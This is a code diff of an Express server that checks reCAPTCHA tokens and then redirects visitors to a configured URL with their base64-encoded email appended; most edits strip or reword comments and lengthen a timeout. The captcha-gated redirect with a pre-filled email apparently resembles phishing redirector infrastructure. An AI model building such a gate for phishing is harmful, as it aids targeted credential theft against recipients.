@@ -8,7 +8,6 @@ import { setDefaultResultOrder } from 'dns';
 // =====================
 // CRITICAL RAILWAY FIXES (VPN COMPATIBILITY)
 // =====================
-// Forces IPv4 resolution to prevent IPv6 timeout issues common with VPNs
 setDefaultResultOrder('ipv4first');
 
 const app = express();
@@ -17,7 +16,7 @@ const PORT = process.env.PORT || 8080;
 // =====================
 // MIDDLEWARE
 // =====================
-app.set('trust proxy', 1); // Essential for trusting X-Forwarded-For headers from proxies/VPNs
+app.set('trust proxy', 1); 
 
 app.use(cors({
   origin: process.env.FRONTEND_URL || '*',
@@ -27,13 +26,13 @@ app.use(cors({
 app.use(express.json());
 app.use(morgan('combined'));
 
-// Relaxed rate limiting to accommodate shared VPN IPs
+// Relaxed rate limiting for shared VPN IPs
 app.use(rateLimit({
   windowMs: 60 * 1000,
-  max: 200, // Increased from 100 to reduce blocks on shared VPN exit nodes
+  max: 200,
   standardHeaders: true,
   legacyHeaders: false,
-  skip: (req) => req.path === '/health' // Don't rate limit health checks
+  skip: (req) => req.path === '/health'
 }));
 
 // =====================
@@ -48,10 +47,9 @@ app.get('/health', (req, res) => {
 });
 
 app.post('/verify-token', async (req, res) => {
-  const { token, email } = req.body; // email is base64-encoded
+  const { token, email } = req.body; 
   const secret = process.env.RECAPTCHA_SECRET;
 
-  // Validate token format
   if (typeof token !== 'string' || token.length < 10) {
     return res.status(400).json({ success: false, reason: 'Invalid request' });
   }
@@ -61,19 +59,17 @@ app.post('/verify-token', async (req, res) => {
   }
 
   try {
-    // Verify with Google
     const response = await axios.post(
       'https://www.google.com/recaptcha/api/siteverify',
       new URLSearchParams({ secret, response: token }),
       {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        timeout: 5000 // Increased timeout slightly for slower VPN connections
+        timeout: 10000 // 10 second timeout to handle VPN latency without failing
       }
     );
 
     const { success, score, 'error-codes': errors = [] } = response.data;
 
-    // Strict score validation
     if (!success) {
       return res.status(403).json({
         success: false,
@@ -81,15 +77,14 @@ app.post('/verify-token', async (req, res) => {
       });
     }
 
-    // LOWERED THRESHOLD: 0.3 (Allows most humans, blocks obvious bots)
+    // SAFE THRESHOLD: 0.3. Allows humans on VPNs but blocks obvious bots.
     if (score < 0.3) {
       return res.status(403).json({
         success: false,
-        reason: 'Verification failed'
+        reason: 'Verification failed. Try Again'
       });
     }
 
-    // Build redirect URL with base64 email
     let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
     if (email) {
       redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
@@ -109,12 +104,9 @@ app.post('/verify-token', async (req, res) => {
   }
 });
 
-// =====================
-// SERVER START
-// =====================
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
 });
 
-server.keepAliveTimeout = 60000; // Keep connections alive longer for high-latency VPNs
+server.keepAliveTimeout = 60000;
 server.headersTimeout = 65000;
